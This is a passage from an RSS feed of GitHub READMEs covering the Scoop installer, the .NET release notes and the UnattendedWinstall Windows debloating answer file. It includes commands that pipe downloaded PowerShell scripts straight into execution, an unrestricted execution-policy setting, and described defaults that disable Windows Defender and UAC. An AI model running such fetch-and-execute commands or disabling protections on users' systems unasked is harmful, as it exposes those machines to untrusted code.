&lt;/p&gt; 
&lt;p&gt;Scoop is a command-line installer for Windows.&lt;/p&gt; 
&lt;h2&gt;What does Scoop do?&lt;/h2&gt; 
&lt;p&gt;Scoop installs apps from the command line with a minimal amount of friction. It:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Eliminates &lt;a href=&quot;https://learn.microsoft.com/windows/security/application-security/application-control/user-account-control/&quot;&gt;User Account Control&lt;/a&gt; (UAC) prompt notifications.&lt;/li&gt; 
 &lt;li&gt;Hides the graphical user interface (GUI) of wizard-style installers.&lt;/li&gt; 
 &lt;li&gt;Prevents polluting the &lt;code&gt;PATH&lt;/code&gt; environment variable. Normally, this variable gets cluttered as different apps are installed on the device.&lt;/li&gt; 
 &lt;li&gt;Avoids unexpected side effects from installing and uninstalling apps.&lt;/li&gt; 
 &lt;li&gt;Resolves and installs dependencies automatically.&lt;/li&gt; 
 &lt;li&gt;Performs all the necessary steps to get an app to a working state.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Scoop is quite script-friendly. Your environment can become the way you like by using repeatable setups. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-console&quot;&gt;scoop install sudo
sudo scoop install 7zip git openssh --global
scoop install aria2 curl grep sed less touch
scoop install python ruby go perl
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If you have built software that you would like others to use, Scoop is an alternative to building an installer (like MSI or InnoSetup). You just need to compress your app to a &lt;code&gt;.zip&lt;/code&gt; file and provide a JSON manifest that describes how to install it.&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;Run the following commands from a regular (non-admin) PowerShell terminal to install Scoop:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: The first command makes your device allow running the installation and management scripts. This is necessary because Windows 10 client devices restrict execution of any PowerShell scripts by default.&lt;/p&gt; 
&lt;p&gt;It will install Scoop to its default location:&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;C:\Users\&amp;lt;YOUR USERNAME&amp;gt;\scoop&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;You can find the complete documentation about the installer, including advanced installation configurations, in &lt;a href=&quot;https://github.com/ScoopInstaller/Install&quot;&gt;ScoopInstaller/Install&lt;/a&gt;. Please create new issues there if you have questions about the installation.&lt;/p&gt; 
&lt;h2&gt;Multi-connection downloads with &lt;code&gt;aria2&lt;/code&gt;&lt;/h2&gt; 
&lt;p&gt;Scoop can utilize &lt;a href=&quot;https://github.com/aria2/aria2&quot;&gt;&lt;code&gt;aria2&lt;/code&gt;&lt;/a&gt; to use multi-connection downloads. Simply install &lt;code&gt;aria2&lt;/code&gt; through Scoop and it will be used for all downloads afterward.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-console&quot;&gt;scoop install aria2
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;By default, &lt;code&gt;scoop&lt;/code&gt; displays a warning when running &lt;code&gt;scoop install&lt;/code&gt; or &lt;code&gt;scoop update&lt;/code&gt; while &lt;code&gt;aria2&lt;/code&gt; is enabled. This warning can be suppressed by running &lt;code&gt;scoop config aria2-warning-enabled false&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;You can tweak the following &lt;code&gt;aria2&lt;/code&gt; settings with the &lt;code&gt;scoop config&lt;/code&gt; command:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;aria2-enabled (default: true)&lt;/li&gt; 
 &lt;li&gt;aria2-warning-enabled (default: true)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://aria2.github.io/manual/en/html/aria2c.html#cmdoption-retry-wait&quot;&gt;aria2-retry-wait&lt;/a&gt; (default: 2)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://aria2.github.io/manual/en/html/aria2c.html#cmdoption-s&quot;&gt;aria2-split&lt;/a&gt; (default: 5)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://aria2.github.io/manual/en/html/aria2c.html#cmdoption-x&quot;&gt;aria2-max-connection-per-server&lt;/a&gt; (default: 5)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://aria2.github.io/manual/en/html/aria2c.html#cmdoption-k&quot;&gt;aria2-min-split-size&lt;/a&gt; (default: 5M)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://aria2.github.io/manual/en/html/aria2c.html#options&quot;&gt;aria2-options&lt;/a&gt; (default: )&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Inspiration&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://brew.sh/&quot;&gt;Homebrew&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://signalvnoise.com/posts/3264-automating-with-convention-introducing-sub&quot;&gt;Sub&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;What sort of apps can Scoop install?&lt;/h2&gt; 
&lt;p&gt;The apps that are most likely to get installed fine with Scoop are those referred to as &quot;portable&quot; apps. These apps are compressed files which can run standalone after being extracted. This type of apps does not produce side effects like changing the Windows Registry or placing files outside the app directory.&lt;/p&gt; 
&lt;p&gt;Scoop also supports installer files and their uninstallation methods. Likewise, it can handle single-file apps and PowerShell scripts. These do not even need to be compressed. See the &lt;a href=&quot;https://github.com/ScoopInstaller/Main/raw/master/bucket/runat.json&quot;&gt;runat&lt;/a&gt; package for an example: it is simply a GitHub gist.&lt;/p&gt; 
&lt;h3&gt;Contribute to this project&lt;/h3&gt; 
&lt;p&gt;If you would like to improve Scoop by adding features or fixing bugs, please read our &lt;a href=&quot;https://github.com/ScoopInstaller/.github/raw/main/.github/CONTRIBUTING.md&quot;&gt;Contributing Guide&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Support this project&lt;/h3&gt; 
&lt;p&gt;If you find Scoop useful and would like to support the ongoing development and maintenance of this project, you can donate here:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;amp;hosted_button_id=DM2SUH9EUXSKJ&quot;&gt;PayPal&lt;/a&gt; (one-time donations)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Known application buckets&lt;/h2&gt; 
&lt;p&gt;The following buckets are known to Scoop:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/Main&quot;&gt;main&lt;/a&gt; - Default bucket which contains popular non-GUI apps.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/Extras&quot;&gt;extras&lt;/a&gt; - Apps that do not fit the main bucket&#39;s &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop/wiki/Criteria-for-including-apps-in-the-main-bucket&quot;&gt;criteria&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/Calinou/scoop-games&quot;&gt;games&lt;/a&gt; - Open-source and freeware video games and game-related tools.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/matthewjberger/scoop-nerd-fonts&quot;&gt;nerd-fonts&lt;/a&gt; - Nerd Fonts.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/Nirsoft&quot;&gt;nirsoft&lt;/a&gt; - A collection of over 250+ apps from &lt;a href=&quot;https://nirsoft.net&quot;&gt;Nirsoft&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/niheaven/scoop-sysinternals&quot;&gt;sysinternals&lt;/a&gt; - The Sysinternals suite from &lt;a href=&quot;https://learn.microsoft.com/sysinternals/&quot;&gt;Microsoft&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/Java&quot;&gt;java&lt;/a&gt; - A collection of Java development kits (JDKs) and Java runtime engines (JREs), Java&#39;s virtual machine debugging tools and Java based runtime engines.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/Nonportable&quot;&gt;nonportable&lt;/a&gt; - Non-portable apps (may trigger UAC prompts).&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/PHP&quot;&gt;php&lt;/a&gt; - Installers for most versions of PHP.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ScoopInstaller/Versions&quot;&gt;versions&lt;/a&gt; - Alternative versions of apps found in other buckets.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The &lt;code&gt;main&lt;/code&gt; bucket is installed by default. You can make use of more buckets by typing:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-console&quot;&gt;scoop bucket add &amp;lt;name&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For example, to add the &lt;code&gt;extras&lt;/code&gt; bucket, type:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-console&quot;&gt;scoop bucket add extras
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You would be able to install apps from the &lt;code&gt;extras&lt;/code&gt; bucket now.&lt;/p&gt; 
&lt;h2&gt;Other application buckets&lt;/h2&gt; 
&lt;p&gt;Many other application buckets hosted on GitHub can be found on &lt;a href=&quot;https://scoop.sh/&quot;&gt;ScoopSearch&lt;/a&gt; or via &lt;a href=&quot;https://rasa.github.io/scoop-directory/#other-search-engines&quot;&gt;other search engines&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>dotnet/core</title>
      <link>https://github.com/dotnet/core</link>
      <description>&lt;p&gt;.NET news, announcements, release notes, and more!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;.NET Release Notes&lt;/h1&gt; 
&lt;p&gt;Welcome to the home of .NET &lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/README.md&quot;&gt;release notes&lt;/a&gt; and &lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/news&quot;&gt;news&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Releases&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/releases.md&quot;&gt;Releases&lt;/a&gt; under active support or development:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;left&quot;&gt;Version&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Release Date&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Support&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Latest Patch Version&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;End of Support&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/10.0/README.md&quot;&gt;.NET 10&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;November 11, 2025&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-policies.md&quot;&gt;LTS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/10.0/preview/preview1/10.0.0-preview.1.md&quot;&gt;10.0.0-preview.1&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;May 8, 2028&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/9.0/README.md&quot;&gt;.NET 9&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;November 12, 2024&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-policies.md&quot;&gt;STS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/9.0/9.0.3/9.0.3.md&quot;&gt;9.0.3&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;May 12, 2026&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/8.0/README.md&quot;&gt;.NET 8&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://devblogs.microsoft.com/dotnet/announcing-dotnet-8/&quot;&gt;November 14, 2023&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-policies.md&quot;&gt;LTS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/8.0/8.0.14/8.0.14.md&quot;&gt;8.0.14&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;November 10, 2026&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/dotnet/core/main/release-notes/README.md&quot;&gt;Release notes&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://dotnet.microsoft.com/download/dotnet&quot;&gt;Binaries and installers&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/dotnet/core/install/&quot;&gt;Installation docs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/dotnet/core/tools/dotnet-install-script&quot;&gt;dotnet-install scripts&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Discussions&lt;/h2&gt; 
&lt;p&gt;Follow &lt;a href=&quot;https://github.com/dotnet/core/discussions&quot;&gt;GitHub Discussions&lt;/a&gt;, where you will find the latest news on releases, including PSAs and CVEs.&lt;/p&gt; 
&lt;p&gt;You can subscribe to discussions with the following RSS feeds:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Category&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;GitHub Discussions&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;RSS Feed&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;All Discussions&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions.atom&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;News&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/news&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/news.atom&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;General&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/general&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/dotnet/core/discussions/categories/general.atom&quot;&gt;🔗&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt;</description>
    </item>
    
    <item>
      <title>memstechtips/UnattendedWinstall</title>
      <link>https://github.com/memstechtips/UnattendedWinstall</link>
      <description>&lt;p&gt;Personalized Unattended Answer Files that helps automatically debloat and customize Windows 10 &amp; 11 during the installation process.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;UnattendedWinstall&lt;/h1&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;UnattendedWinstall leverages Microsoft&#39;s &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11&quot;&gt;Answer Files&lt;/a&gt; (or Unattend files) to automate and customize Windows installations. &lt;br&gt; It enables modifications to Windows Settings and Packages directly in the Windows ISO during setup.&lt;/p&gt; 
&lt;h3&gt;Why Use an Answer File?&lt;/h3&gt; 
&lt;h4&gt;Security&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Provides transparency by allowing inspection of all changes in the answer file.&lt;/li&gt; 
 &lt;li&gt;Runs directly on official Windows ISOs from Microsoft, eliminating the need for unofficial sources.&lt;/li&gt; 
 &lt;li&gt;Utilizes a Microsoft-supported feature designed for streamlined mass deployment of Windows installations.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Automation&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Enables automated configuration across multiple devices, saving time and effort by eliminating repetitive manual setups.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] UnattendedWinstall has been tested and optimized for personal use. For those interested in customizing further, &lt;a href=&quot;https://schneegans.de/windows/unattend-generator/&quot;&gt;create your own answer file&lt;/a&gt; following &lt;a href=&quot;https://youtu.be/WyLiJl-NQU8&quot;&gt;this video guide&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Versions&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/releases/tag/v2.1.0&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Version-2.1.0%20Latest-0078D4?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Version 2 Release (Latest)&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/releases/tag/v1.0.0&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Version-1.0.0-FFA500?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Version 1 Release&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Support the Project&lt;/h3&gt; 
&lt;p&gt;If UnattendedWinstall has been useful to you, consider supporting the project, it really does help!&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://paypal.me/memstech&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Support-via%20PayPal-FFD700?style=for-the-badge&amp;amp;logo=paypal&amp;amp;logoColor=white&quot; alt=&quot;Support via PayPal&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Feedback and Community&lt;/h3&gt; 
&lt;p&gt;If you have feedback, suggestions, or need help with UnattendedWinstall, please feel free to join the discussion on GitHub or our Discord community:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/discussions&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Join the Discussion&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://www.discord.gg/zWGANV8QAX&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Join-Discord%20Community-5865F2?style=for-the-badge&amp;amp;logo=discord&amp;amp;logoColor=white&quot; alt=&quot;Join Discord Community&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Requirements&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Windows 10 or Windows 11 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;(Tested on Windows 10 22H2 &amp;amp; Windows 11 24H2)&lt;/em&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;em&gt;(32-bit, 64-bit and arm64 is supported)&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;What Does UnattendedWinstall Do?&lt;/h2&gt; 
&lt;p&gt;The UnattendedWinstall answer file comes with detailed descriptions for nearly all configurations and registry tweaks, which are available for inspection here on GitHub. For customization, download the answer file and open it in editors like &lt;a href=&quot;https://www.cursor.com/&quot;&gt;Cursor&lt;/a&gt; or &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VSCode&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Sources and Contributions&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Base Answer File Generation&lt;/strong&gt;: 
   &lt;ul&gt; 
    &lt;li&gt;&lt;a href=&quot;https://schneegans.de/windows/unattend-generator/&quot;&gt;Schneegans Unattend Generator&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Tweaks &amp;amp; Optimizations&lt;/strong&gt;: 
   &lt;ul&gt; 
    &lt;li&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil&quot;&gt;ChrisTitusTech WinUtil&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://github.com/FR33THYFR33THY/Ultimate-Windows-Optimization-Guide&quot;&gt;FR33THY&#39;s Ultimate Windows Optimization Guide&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Additional Tweaks&lt;/strong&gt;: 
   &lt;ul&gt; 
    &lt;li&gt;&lt;a href=&quot;https://github.com/ntdevlabs/tiny11builder&quot;&gt;Tiny11Builder&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://www.tenforums.com/&quot;&gt;Ten Forums&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://www.elevenforum.com/&quot;&gt;Eleven Forum&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://winaerotweaker.com/&quot;&gt;Winaero Tweaker&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h3&gt;Key Features&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Ability to choose Windows Edition (Pro is not enforced anymore as in v2.0.0)&lt;/li&gt; 
 &lt;li&gt;Bypasses Windows 11 system requirements&lt;/li&gt; 
 &lt;li&gt;Disables Windows Defender services by default 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;prompted to enable after Windows installation&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Disables User Account Control by default 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;prompted to enable after Windows installation&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Allows execution of PowerShell scripts by default&lt;/li&gt; 
 &lt;li&gt;Skips forced Microsoft account creation during Windows setup&lt;/li&gt; 
 &lt;li&gt;Removes preinstalled bloatware apps except Microsoft Edge, Notepad and Calculator 
  &lt;ul&gt; 
   &lt;li&gt;Copilot and Recall is Disabled.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Sets privacy-related registry keys to disable telemetry&lt;/li&gt; 
 &lt;li&gt;Limits Windows Update to install only security updates for one year&lt;/li&gt; 
 &lt;li&gt;Optimizes registry with various optimization and customization-related keys 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;See the &quot;Set-RecommendedHKLMRegistry&quot; and &quot;Set-RecommendedHKCURegistry&quot; functions for more information&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Disables unnecessary scheduled tasks&lt;/li&gt; 
 &lt;li&gt;Configures Windows services for optimal performance&lt;/li&gt; 
 &lt;li&gt;Enables the Ultimate Performance power plan&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] Use the &lt;code&gt;UWScript.ps1&lt;/code&gt; file once Windows is installed to reapply or revert settings in case Windows Update resets some of the settings or if you encounter any issues.&lt;br&gt; It can also be used to achieve a similar experience to UnattendedWinstall on an existing Windows installation without reinstalling Windows.&lt;/p&gt; 
 &lt;hr&gt; 
 &lt;p&gt;&lt;strong&gt;Before Running the Script&lt;/strong&gt;&lt;/p&gt; 
 &lt;p&gt;Ensure you open PowerShell as an administrator. Additionally, set the execution policy to allow script execution by running the following command:&lt;/p&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;Set-ExecutionPolicy Unrestricted
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;Running PowerShell with elevated permissions and enabling script execution will ensure that &lt;code&gt;UWScript.ps1&lt;/code&gt; can apply the necessary system changes.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Usage Instructions&lt;/h2&gt; 
&lt;p&gt;To use an answer file, include &lt;code&gt;autounattend.xml&lt;/code&gt; at the root of your Windows Installation Media to be executed during Windows setup.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT]&lt;br&gt; Ensure the answer file is named &lt;code&gt;autounattend.xml&lt;/code&gt;; otherwise, it won’t be recognized by the installer.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;hr&gt; 
&lt;h3&gt;Using Memory&#39;s &lt;a href=&quot;https://github.com/memstechtips/WIMUtil&quot;&gt;WIMUtil&lt;/a&gt; (Highly Preferred)&lt;/h3&gt; 
&lt;p&gt;To use &lt;strong&gt;WIMUtil&lt;/strong&gt;, follow these steps to launch PowerShell as an Administrator and run the installation script:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Open PowerShell as Administrator:&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Windows 10/11&lt;/strong&gt;: Right-click on the &lt;strong&gt;Start&lt;/strong&gt; button and select &lt;strong&gt;Windows PowerShell (Admin)&lt;/strong&gt; or &lt;strong&gt;Windows Terminal (Admin)&lt;/strong&gt;. &lt;br&gt; PowerShell will open in a new window.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Confirm Administrator Privileges&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;If prompted by the User Account Control (UAC), click &lt;strong&gt;Yes&lt;/strong&gt; to allow PowerShell to run as an administrator.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Paste and Run the Command&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Copy the following command: &lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;irm &quot;https://github.com/memstechtips/WIMUtil/raw/main/src/WIMUtil.ps1&quot; | iex
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
   &lt;li&gt;To paste into PowerShell, &lt;strong&gt;Right-Click&lt;/strong&gt; or press &lt;strong&gt;Ctrl + V&lt;/strong&gt; in the PowerShell or Terminal window. &lt;br&gt; This should automatically paste your copied command.&lt;/li&gt; 
   &lt;li&gt;Press &lt;strong&gt;Enter&lt;/strong&gt; to execute the command.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Once launched, &lt;strong&gt;WIMUtil&lt;/strong&gt; guides you through a wizard:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Select or Download Windows ISO&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Add Latest UnattendedWinstall Answer File Automatically&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Extract and Add Current Device Drivers to Installation Media&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Create New ISO with Customizations Included&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Create a Bootable USB Flash Drive with &lt;a href=&quot;https://github.com/ventoy/Ventoy&quot;&gt;Ventoy&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Copy the New ISO File to the Ventoy Flash Drive&lt;/strong&gt;&lt;/li&gt; 
